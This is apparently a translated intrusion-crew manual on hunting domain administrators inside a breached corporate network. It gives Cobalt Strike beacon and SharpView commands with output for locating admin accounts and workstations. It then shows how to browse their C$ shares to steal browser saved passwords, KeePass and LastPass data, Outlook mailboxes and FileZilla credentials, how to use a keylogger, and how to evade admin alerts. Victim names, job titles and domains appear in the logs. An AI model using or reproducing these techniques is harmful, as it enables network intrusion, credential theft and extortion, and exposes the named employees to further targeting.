```Verwaltung hantim.

Wenn wir also Server/NACs oder Cloud-Speicher haben, auf denen Backups gespeichert werden, und wir keinen Zugang haben, brauchen wir Anmeldedaten, die nur der Administrator hat.
Wir müssen ihn also ins Boot holen. In den Netzen, in denen wir arbeiten, gibt es in der Regel höchstens 1-2-3 Administratoren.
Die Menschen unterteilen Positionen in 3 Typen:

Senior(Старший)
Medium(Средний)
Junior(Младший)

Natürlich sind wir an den Senioren interessiert, da sie mehr Privilegien/Zugänge (sprich: Passwörter) haben.


Zunächst möchte ich einige Möglichkeiten aufzeigen, wie man die Konten derjenigen Administratoren identifizieren kann, die Passwörter an Bord haben.

Teil 1::
      Option 1:
         Vorstellungsgespräch YES

```

beacon> shell net group "domain admins" /domain

    Tasked beacon to run: net group "domain admins" /domain
    host called home, sent: 64 bytes
    received output:


Die Anfrage wird auf dem Domain Controller der Domain DOMAIN.com bearbeitet.

Name der Gruppe     Domain Admins
Kommentar       Designated administrators of the domain

Mitglieder

-------------------------------------------------------------------------------
Administrator            ClusterSvc               createch                 
Createch2                d01adm                   da9adm                   
p01adm                   PMPUser                  q01adm                   
repl                     s01adm                   Sapserviced01           
SAPServiceDA9            sapservicep01            SAPServiceQ01           
sapservices01            SAPServiceSND            SAPServiceSOL           
services                 services2                sndadm                   
soladm                   somadm                   staseb                   
telnet                   Johnadm               
Der Auftrag wurde korrekt ausgeführt.

```

Überwachen und filtern Sie Dienstleistungs- und Nichtdienstleistungskonten mit Ihren Augen.
Die Dienste in der obigen Liste sind zum Beispiel
```
SAPServiceDA9
services
telnet
servies2
Sapservice01
...

```

Welche Konten wären für uns am besten geeignet?:
```staseb
Johnadm
```

Sie wurden aufgezeichnet.

Wir können in adfind_persons.txt sehen, wer sie sind

oder über den Befehl
```shell net user staseb /domain
```

Siehe Beispiel:
```

beacon> shell net user ebernardo /domain

    Tasked beacon to run: net user ebernardo /domain
    host called home, sent: 57 bytes
    received output:


User name                    ebernardo
Full Name                    Eric Bernardo
Comment                     
User's comment               
Country/region code          (null)
Account active               Yes
Account expires              Never

Password last set            2020-12-08 12:05:15 PM
Password expires             2021-06-06 12:05:15 PM
Password changeable          2020-12-08 12:05:15 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2021-01-29 2:25:24 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Desktop Users
                             *Server Operators     
Global Group memberships     *US Users             *Great Plains Users   
                             *Citrix Group         *VPN Users Saskatoon 
                             *Admins - AD Basic    *VPNUsersHeadOffice   
                             *Executives           *All Winnipeg Staff   
                             *Scribe Console Users *Domain Admins       
                             *VPN Users USA        *Workstation.admins   
                             *Domain Users         
The command completed successfully.

```

Wir sehen uns an, wer er ist - er ist in einem Dutzend Gruppen, und es steht ÜBERHAUPT in der Kommentarspalte, was er ist - Ingenieur/Systemadministrator/Support/Business Consultant.
Bei der letzten Anmeldung muss das Konto AKTIV sein - d. h. letzte Anmeldung heute/ gestern/ diese Woche, aber nicht vor einem Jahr oder nie..
Wenn Sie nach der Umfrage nicht wissen, wer er ist, sehen Sie bei adfind nach + überprüfen Sie linkedin (Abschnitt unten).

So 2-3-5 Konten am Ende erhalten Sie von den Domain-Administratoren und Umfrage jeder und sollte eine Idee haben, wer es ist. Am Ende von 1-2-3 Konten ist es möglich, herauszufinden, wer ein Administrator sein kann.


   Option #2:
      Zu Hausanalysten werden - Adfind beobachten.
      Wir interessieren uns für die Datei adfind_groups
      Reingehen, einen Haufen Text sehen
      Klicken Sie auf Ctrl + F(Notepad2 / Geany)
      Eingabe
      ```dn:CN=
      ```
      Und die Schaltfläche Find All in current document.
      
      Die Ausgabe sieht EXAKT wie folgt aus (ich habe einen Teil herausgeschnitten und 10-20 Zeilen übrig gelassen, normalerweise sind es 100 bis 10.000 Zeilen)
      ```
      
adfind_groups:3752: dn:CN=SQLServer2005SQLBrowserUser$TRUCAMTLDC,CN=Users,DC=domain,DC=com
adfind_groups:3775: dn:CN=clubsocial,CN=Users,DC=domain,DC=com
adfind_groups:3800: dn:CN=Signature Intl-Special,OU=Groupes,OU=Infra,DC=domain,DC=com
adfind_groups:3829: dn:CN=FIMSyncAdmins,CN=Users,DC=domain,DC=com
adfind_groups:3852: dn:CN=GRP-GRAPHISTE,OU=FG-GRP,DC=domain,DC=com
adfind_groups:3877: dn:CN=IT,CN=Users,DC=domain,DC=com
adfind_groups:3902: dn:CN=MSOL_AD_Sync_RichCoexistence,CN=Users,DC=domain,DC=com
adfind_groups:3925: dn:CN=WinRMRemoteWMIUsers__,CN=Users,DC=domain,DC=com
adfind_groups:3946: dn:CN=EDI,CN=Users,DC=domain,DC=com
adfind_groups:3967: dn:CN=Signature Canada,OU=Groupes,OU=Infra,DC=domain,DC=com
adfind_groups:4037: dn:CN=Signature USA,OU=Groupes,OU=Infra,DC=domain,DC=com

      ```
      
      Und so haben wir die Active Directory-Gruppen extrahiert
      Was uns hier interessiert und warum wir das getan haben - in der aktiven Regie ist alles strukturiert und in den EU-Netzen der USA wird alles so transparent wie möglich gemacht, mit Kommentaren, Anmerkungen, Schreibweisen usw.
      Wir sind an einer Gruppe interessiert, die sich mit IT, Verwaltung und LAN-Technik beschäftigt.
      Die Suchergebnisse werden in einem neuen Notizblock angezeigt, und es wird nach folgenden Stichworten gesucht:
      ```
      IT
      Admin
      engineer
      -----
      ```
      
      Im obigen Beispiel finden wir die folgende Zeile
      ```
      adfind_groups:3877: dn:CN=IT,CN=Users,DC=domain,DC=com
      ```
      
      Gehen Sie zu Zeile 3877 in adfind_Groups.txt und sehen Sie Folgendes:
      ```
      
dn:CN=IT,CN=Users,DC=domain,DC=com
>objectClass: top
>objectClass: group
>cn: IT
>description: Informatique
>member: CN=MS Surface,OU=IT,DC=domain,DC=com
>member: CN=Gyslain Petit,OU=IT,DC=domain,DC=com
>member: CN=ftp,CN=Users,DC=domain,DC=com
>member: CN=St-Amand\, Sebastien\, CDT,OU=IT,DC=domain,DC=com
```

Die ftp- und MS Surface-Benutzer werden übersprungen, aber Gyslain Petit und St. Amand Sebastien werden mit an Bord genommen
Als nächstes öffnen Sie ad_users.txt
Auftritt Gyslain Petit
Suchen Sie einen Benutzer mit den folgenden Informationen:
```

dn:CN=Gyslain Petit,OU=IT,DC=trudeaucorp,DC=com
>objectClass: top
>objectClass: person
>objectClass: organizationalPerson
>objectClass: user
>cn: Gyslain Petit
>sn: Petit
>title: Directeur, technologie de l'information
>physicalDeliveryOfficeName: 217
>givenName: Gyslain
>distinguishedName: CN=Gyslain Petit,OU=IT,DC=trudeaucorp,DC=com
>instanceType: 4
>whenCreated: 20020323153742.0Z
>whenChanged: 20201212071143.0Z
>displayName: Gyslain Petit
>uSNCreated: 29943
>memberOf: CN=GRP_Public_USA_P,OU=Securite-GRP,DC=trudeaucorp,DC=com
>memberOf: CN=GRP-LDAP-VPN,OU=FG-GRP,DC=trudeaucorp,DC=com
>memberOf: CN=IT Support,CN=Users,DC=trudeaucorp,DC=com
>memberOf: CN=Directeurs,CN=Users,DC=trudeaucorp,DC=com
>memberOf: CN=GRP-IT,OU=FG-GRP,DC=trudeaucorp,DC=com
>memberOf: CN=Signature Canada,OU=Groupes,OU=Infra,DC=trudeaucorp,DC=com
>memberOf: CN=EDI,CN=Users,DC=trudeaucorp,DC=com
>memberOf: CN=IT,CN=Users,DC=trudeaucorp,DC=com
>memberOf: CN=TRUDEAU-MONTREAL,CN=Users,DC=trudeaucorp,DC=com
>memberOf: CN=everyone,CN=Users,DC=trudeaucorp,DC=com
>uSNChanged: 6908986
>department: IT Manager
```
Werfen wir einen Blick auf den Titel und wen haben wir hier? Direktor für Informationstechnologie. Ein Volltreffer, könnte man meinen, aber ein Direktor hat nicht immer Passwörter, ein Systemadministrator hingegen schon.
Daher führen wir für den zweiten oder weiteren Benutzer ähnliche Manipulationen durch. Notieren Sie sich, wer wer in der Konfab ist, und schreiben Sie die Logins aus dem Anhang (sAMAccountname) wie folgt:
```>sAMAccountName: gpetit
```

```
gpetit - Direktor von Aiti
staseb - dies und jenes
```


Zweiter Teil von Option 2 (vereinfacht):
Ursprünglicher Blick auf adfind_users.txt
Eine Suche nach
```title:
description
departament
```
Wenn Sie Glück haben, werden die Stellen direkt dort ausgeschrieben. In meinem Testfall sieht das so aus:

```
adfind_persons:280: >title: Responsable, logistique direct import
adfind_persons:1836: >title: Chef des services techniques
adfind_persons:1955: >title: Chef comptable
adfind_persons:4544: >title: Directeur, technologie de l'information
adfind_persons:6064: >title: Présidente
adfind_persons:6191: >title: Chargée de projets, mise en marché
adfind_persons:6285: >title: Directrice marketing
adfind_persons:6848: >title: Coordonnatrice à la logistique
adfind_persons:6948: >title: Responsable de l'expedition
```

Wir überprüfen sie also mit den Augen und finden die Konten.


Das sind also einfache Methoden. Erwägen Sie alternative Suchmöglichkeiten für Verwaltungskonten.
Ich kenne bisher nur 1 einfache Methode - linkedin
Geben Sie eine Google-Abfrage ein
```
НNASHJURT.COM linkedin
```
anstelle der Domäne - die Domäne des Büros eingeben.

Zu den Mitgliedern gehen
Suchen Sie dort nach
```
System
Admin
Engineer
Network
It
```
Wenn der Vor- und Nachname einer Person angezeigt wird, geben Sie ihn in den Anhang ein und das Konto wird gefunden..
Wenn Sie eine effektivere Methode kennen, schreiben Sie bitte an @rozetka

Und damit ist Teil 1 abgeschlossen.

Weiter geht's mit der Verwaltungsjagd und Inspektion

Teil 2:
Hunt-Admin standardmäßig über SharpView
SharpView.exe kann von Ihren Teammitgliedern in der Konferenz oder vom Software-Konferenzraum bezogen werden
Das Team für die Jagd sieht folgendermaßen aus:
On Linux
```
execute-assembly /home/user/soft/scripts/SharpView.exe Find-DomainUserLocation -UserIdentity gpetit
```
On Windows >
```
execute-assembly C:\Users\Андрей\Soft\Hacking\SharpView.exe Find-DomainUserLocation -UserIdentity gpetit
```

wobei gpetit das Konto der gesuchten Person ist. Was in adfinusers in sAMAccountname steht, wird hier eingefügt.

Die Ausgabe entspricht ungefähr dem folgenden Protokoll:

```

UserDomain      : domain
UserName        : gpetit
ComputerName    : DC01.domain.LOCAL
IPAddress       : 172.16.1.3
SessionFrom     : 192.168.100.55
SessionFromName :
LocalAdmin      :

UserDomain      : domain
UserName        : gpetit
ComputerName    : SQL01.domain.LOCAL
IPAddress       : 172.16.1.30
SessionFrom     :  192.168.100.55
SessionFromName :
LocalAdmin      :

UserDomain      : domain
UserName        : gpetit
ComputerName    : lptp-gpetit.domain.LOCAL
IPAddress       : 172.16.1.40
SessionFrom     : 192.168.100.55
SessionFromName :
LocalAdmin      :

```


Das Protokoll wird also ungefähr dieses Format haben, wie sollten wir damit umgehen -
Erstens: Die Software fragt ab, wo der Nutzer derzeit zugelassen ist. Und der Benutzer ist kein gewöhnlicher Benutzer - er ist ein Administrator und kann irgendwann für 20-30-50 Server berechtigt sein..
Wie können wir filtern und uns nicht darin verzetteln?
Zunächst entfernen wir die Betriebssysteme, an denen wir nicht interessiert sind
z.B. ist der erste DC01 eindeutig DomainController01, Sie können ihn mit adfind_computers.txt oder portscan 172.16.1.13 überprüfen und sehen, dass es ein SERVER OS ist. Wir brauchen ein Client-Betriebssystem.
Das zweite ist SQL01 - das Datenbankbetriebssystem. Sie ist für uns nicht geeignet.
Ich schaue mir die dritte an - lptp-gpetit. Hmm, der Name unseres Benutzers ist gpetit, und lptp steht für Laptop. Das war's dann wohl.
#Es kommt auch vor, dass der Admin NUR mit dem Server-OS verbunden ist, aber in der SessionFrom-Spalte die IP aus einem anderen Subnetz (z.B. vpn-Subnetz) steht, wo er ruhig sitzt, aber SharpView ihn nicht "abgeholt" hat - kann auch in Umlauf gebracht werden.
Es folgt der WICHTIGE PARAGRAF.
Das erste, was Neulinge versuchen, ist, dort eine Sitzung einzuberufen, und sie bekommen SEHR oft eine Meldung. Alarm beim Administrator = Rauswurf aus dem Netz, Zeit- und Nervenverschwendung. Das ist NICHT der richtige Weg!
Wir werden sie über das Dateisystem abfragen.
Gehen Sie wie folgt vor
```shell net view \\172.16.1.40 /ALL
```

Am Ausgang sehen wir seine lokalen discs
```
C$
D$
```
Tragen Sie ein Token (ein Token wird empfohlen, da pth eine leicht abweichende Ereignis-ID auf dem Domänencontroller hinterlässt, und dies kann vom Administrator bemerkt und aus uns herausgeworfen werden)

Dateimanager in Cobalt öffnen:
```\\172.16.1.40\c$
```

oder verwenden Sie die Shell über
```
shell dir \\172.16.1.40\c$```

Der Inhalt des Laufwerks C im Überblick
Gehen Sie zum Ordner
```\\172.16.1.40\c$\Users\gpetit
```

Wenn es sich tatsächlich um eine Admin-Station handelt, gibt es in der Regel eine Menge Müll wie Virtualbox, Putty, Winscp usw.

Wie können wir uns "umsehen", hier ist eine Liste interessanter Verzeichnisse:

Desktop
```\\172.16.1.40\c$\Users\gpetit\Desktop
```
```
\\172.16.1.40\c$\Users\gpetit\OneDrive
\\172.16.1.40\c$\Users\gpetit\Downloads
\\172.16.1.40\c$\Users\gpetit\Desktop
\\172.16.1.40\c$\Users\gpetit\Documents

```
Hier sind die Ordner mit den Benutzerkonfigurationen, unten ist eine Liste, was extrahiert werden kann:
```\\172.16.1.40\c$\Users\gpetit\AppData\Local
```

```\\172.16.1.40\c$\Users\gpetit\AppData\Roaming
```

```
\\172.16.1.40\c$\Users\gpetit\AppData\Local\Google\Chrome\User Data\Default
```
Hier sind die Historie und die Anmeldedaten von Chrome.
Historien können mit DBrowser for SQLite (nix win) direkt heruntergeladen und angesehen werden. Nützlich - Sie sehen, wohin der Admin geht, für wen er stimmt, Sie können die Geschichten nach Titel sortieren und NAS / Tape / vSphere usw. finden. SEHR nützliche Sache.
Login Data - sind die Logins und Passwörter. Verschlüsselt(!). Wenn sie 38-42kb wiegt, ist sie leer. Wenn es mehr als 40-45kb sind (von 100kb bis 1-2 Megabyte) - dann gibt es definitiv Passwörter. Wenn es eine URL mit einem Passwort gibt - wenden Sie sich an Ihren Teamleader
In Chrome kommt es auch vor, dass im Anmeldedatum keine Passwörter stehen, aber wenn Sie sich den Profilordner genau ansehen, finden Sie dort den Ordner extenstions und dort lastpass. Dies kann auch in der Praxis vorkommen - melden Sie sich in diesem Fall nachts über RDP an und exportieren Sie Passwörter (entweder mit einem Keylogger oder anderen Optionen).

Ebenso kann der Firefox/Edge-Ordner eingesehen werden (Pfade ergänzt, leicht zu googeln)

Auch Systemadministratoren haben oft die folgenden Ordner in AppData\Roaming && AppData\Local:
```Keepass
LastPass
```
dort sind ihre Konfigurationen. Wenn dies gefunden wird, bedeutet dies, dass es wahrscheinlich viele richtige Kennwörter gibt.

Es kommt auch vor, dass ein Administrator ala
```access.xlsx
passwords.docx
```
Herunterladen, brechen, anschauen.

Es gibt auch einen Outlook-Ordner
```\\172.16.1.40\c$\Users\gpetit\AppData\Local\Microsoft\Outlook
```
Hier liegt die Datei ala
```gpetit@domain.com - Exchange1.ost
```
Sie enthält einen DRUCK auf die betreffende Person. Sie können die Datei herunterladen, sie in einem kostenlosen Ost-Viewer öffnen und den E-Mail-Eingang bzw. -Ausgang betrachten. REGELMÄSSIG kann es nützlich sein, schwierige Situationen mit dieser besonderen Technik zu bewältigen.
Das Kopieren ist einfach - outlook.exe ausschalten, die .ost-Datei kopieren, dann öffnet der Benutzer selbst outlook.

```
\\172.16.1.40\c$\Users\gpetit\AppData\Local\Filezilla
\\172.16.1.40\c$\Users\gpetit\AppData\Roaming\Filezilla
```
Hier können sitemanager.xml-Dateien mit FTP SSH-Zugangsdaten sein. Herunterladen, ansehen, in die Konf werfen.


Wir schauen uns auch um \\172.16.1.40\C$\ProgramData
+Program files / x86
+ Lokale Laufwerke, die in net view \\host /ALL
D$ usw.

Es gibt auch ein homeDir in ad_users.txt - sehen Sie auch dort nach.


Das war's dann auch schon.

Das Handbuch wurde geschrieben, um zu verhindern, dass man sich Hals über Kopf in eine Sitzung stürzt und Warnmeldungen des Administrators abfängt.
Bei unserer Arbeit geht es eher darum, herauszufinden, wie die Dinge funktionieren, als Bruteforces bei allen möglichen Zugriffen einzurichten.
Alles ist bereits gehackt worden, man muss sich nur alles ansehen!
Die größte Herausforderung beim Hacken eines Administrators besteht darin, herauszufinden, wo er die Passwörter aufbewahrt und die Datenbank/Excel/Datei/Dokumente zu stehlen.